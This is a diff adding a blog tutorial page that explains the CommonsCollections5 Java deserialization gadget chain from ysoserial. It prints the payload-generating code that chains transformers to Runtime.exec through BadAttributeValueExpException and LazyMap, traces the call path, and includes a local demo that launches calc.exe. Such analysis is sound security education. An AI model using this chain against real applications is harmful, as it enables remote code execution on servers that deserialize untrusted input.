@@ -1,0 +1,224 @@
+---
+layout: default
+---
+<html>
+<body>
+<h1>CommonsCollection5</h1>
+
+
+<p>
+    THe CommonsCollection5 payload is more or less similar to the CommonsCollection1 payload.<br>
+    Just like we used a chain of transformers there we will be Using the same Chain of TransFormers here.<br>
+
+    However the Etnry point is different here.<br>
+    Here we will be using  a class called BadAttributeValueExpException class to reach our Goal<br>
+    <br>
+    So lets jump in and see how the payload looks like
+</p>
+
+<p>
+    <pre>
+        <code>
+            public BadAttributeValueExpException getObject(final String command) throws Exception {
+                final String[] execArgs = new String[] { command };
+                // inert chain for setup
+                final Transformer transformerChain = new ChainedTransformer(
+                        new Transformer[]{ new ConstantTransformer(1) });
+                // real chain for after setup
+                final Transformer[] transformers = new Transformer[] {
+                        new ConstantTransformer(Runtime.class),
+                        new InvokerTransformer("getMethod", new Class[] {
+                            String.class, Class[].class }, new Object[] {
+                            "getRuntime", new Class[0] }),
+                        new InvokerTransformer("invoke", new Class[] {
+                            Object.class, Object[].class }, new Object[] {
+                            null, new Object[0] }),
+                        new InvokerTransformer("exec",
+                            new Class[] { String.class }, execArgs),
+                        new ConstantTransformer(1) };
+        
+                final Map innerMap = new HashMap();
+        
+                final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        
+                TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+        
+                BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+                Field valfield = val.getClass().getDeclaredField("val");
+                Reflections.setAccessible(valfield);
+                valfield.set(val, entry);
+        
+                Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
+        
+                return val;
+            }
+        </code>
+    </pre>
+</p>
+
+
+<p>
+    As we previously know about the ClassCastException and readObject, the same thing happens here as well.
+    <br><br>
+    Lets Check the source of BadAttributeValueExpException
+</p>
+<p>
+    The BadAttributeValueExpException has the following code block on its class
+</p>
+<p>
+    <pre>
+        <code>
+            private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+                ObjectInputStream.GetField gf = ois.readFields();
+                Object valObj = gf.get("val", null);
+        
+                if (valObj == null) {
+                    val = null;
+                } else if (valObj instanceof String) {
+                    val= valObj;
+                } else if (System.getSecurityManager() == null
+                        || valObj instanceof Long
+                        || valObj instanceof Integer
+                        || valObj instanceof Float
+                        || valObj instanceof Double
+                        || valObj instanceof Byte
+                        || valObj instanceof Short
+                        || valObj instanceof Boolean) {
+                    val = valObj.toString();
+                } else { // the serialized object is from a version without JDK-8019292 fix
+                    val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
+                }
+            }
+         }
+        </code>
+    </pre>
+</p>
+<p>A custom ReadObject implementation.</p>
+<p>Which means even if there will be a class cast exception, the code present on the readObject will still be executed.</p>
+<p>
+    Looking into the code, the point of interest is the valObj.toString()
+</p>
+<p>IF you pay close attention this valObj is getting set from the gf.get("val") </p>
+<p>This particular class also have val variable which gets set via the constrcutors, that in our payload we are sending as null.</p>
+
+<p>SO if we can controll this variable we can make the decission , which toString() to get executed.</p>
+<p>In our payload we are setting the val field to the entry via Refelction and the entry is basically a TiedMapEntry Object. </p>
+<p>We will not discuss how exactly the TiedMapEntry works, but what happens this class imnplements the map interface and have a fucntion called toString()</p>
+<p>So if we pass the entry(Object of TiedMapEntry) to the BadAttributeValueExpException() then then the toString() of TiedMapEntry can be called<br><br>
+Diving deep into the toString() we see that the function calls getValue() which indeed calls map.get() </p>
+<p>
+    <img src="images/cc/TiedMaptoString.PNG">
+    <br>
+    <br>
+    <img src="images/cc/getValueTiedMapEntry.PNG">
+</p>
+
+<p>Going back to the payload the Map we  are using is the LaZyMap</p>
+<p>And the way we are using LazyMap is by using the decorate function which takes a HashMap and Transformer</p>
+<p>
+    Lets Review the LaZyMap.get()
+</p>
+<p>
+    <pre>
+        <code>
+            public Object get(Object key) {
+                // create value for key if key is not currently in the map
+                if (map.containsKey(key) == false) {
+                    Object value = factory.transform(key);
+                    map.put(key, value);
+                    return value;
+                }
+                return map.get(key);
+            }
+        </code>
+    </pre>
+</p>
+<p>
+    So when the TiedMapEntry calls the map.get() the above get gets called.<br><br>
+    On the above function , if the key is absent then the transformer.transform gets called where the transfromer is been taken from user and gets intitlised into the LaZyMap<br>
+    factory variable via constructors.
+</p>
+<p>
+    <img src="images/cc/LazyMapCodeAnalysis.PNG">
+</p>
+
+<p>
+    THe TransFormer.transform executes the code , which we have discussed in the previous on how.
+</p>
+<p>
+    So taking all the above, the payload uses the BadAttributeValueExpException() to reach till the transformer like below.
+    <br>
+    <pre>
+    ObjectInputStream.readObject()
+        BadAttributeValueExpException.readObject()
+            TiedMapEntry.toString()
+                LazyMap.get()
+                    ChainedTransformer.transform()
+                        ConstantTransformer.transform()
+                        InvokerTransformer.transform()
+                            Method.invoke()
+                                Class.getMethod()
+                        InvokerTransformer.transform()
+                            Method.invoke()
+                                Runtime.getRuntime()
+                        InvokerTransformer.transform()
+                            Method.invoke()
+                                Runtime.exec()
+                                        
+    </pre>
+</p>
+<p>
+    Below is the slight modification of the above code where we have used java8u202 to execute the payload in locainstnace and instead of using refelction to set the val<br>
+    Variable we are directly passing the val varibale to the BadAttributeValueExpException() construtor.
+</p>
+<p>
+    The reason we can not use the same for gadget chain construction is: <br><br>
+    if we pass entry directly to BadAttributeValueExpException  then the constuctor there will call the toString() immediately resulting in immeidate code execution and we will not be able craft a serilised payload.<br><br>
+
+This is the reasson why reflection is used to set this variable in the later Stage.<br><br>
+
+This is also a reason why on most of the ysoserial payloads we are using reflection to make the changes in the later satage so that we can craft the serilised payload and doesn't execute code immediately in our local instance.
+</p>
+<p>
+    <pre>
+        <code>
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.Transformer;
+import javax.management.BadAttributeValueExpException;
+import java.util.HashMap;
+import java.util.Map;
+
+public class cc5 {
+
+public static void main(String args[])
+{
+		ConstantTransformer tr1=new ConstantTransformer(Runtime.class);
+		InvokerTransformer tr2=new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]});
+		InvokerTransformer tr3=new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]});
+		InvokerTransformer tr4=new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"});
+		Transformer tr5=new ChainedTransformer(new Transformer[]{tr1,tr2,tr3,tr4});
+		
+        final Map innerMap = new HashMap();
+		final Map lazyMap = LazyMap.decorate(innerMap, tr5);
+		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+		BadAttributeValueExpException val = new BadAttributeValueExpException(entry);
+}
+}
+
+        </code>
+    </pre>
+</p>
+<p>
+    <img src="images/cc/cc5CalcPopup.PNG">
+</p>
+<p>Thats it for Today.</p>
+<p>Thanks For Reading.</p>
+<p>Happy Hacking.</p>
+<p>You can connect with me at:</p>
+<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
+<p><a href="https://x.com/webspl01t3r">Twitter</a></p>
+
+</body>
+</html>
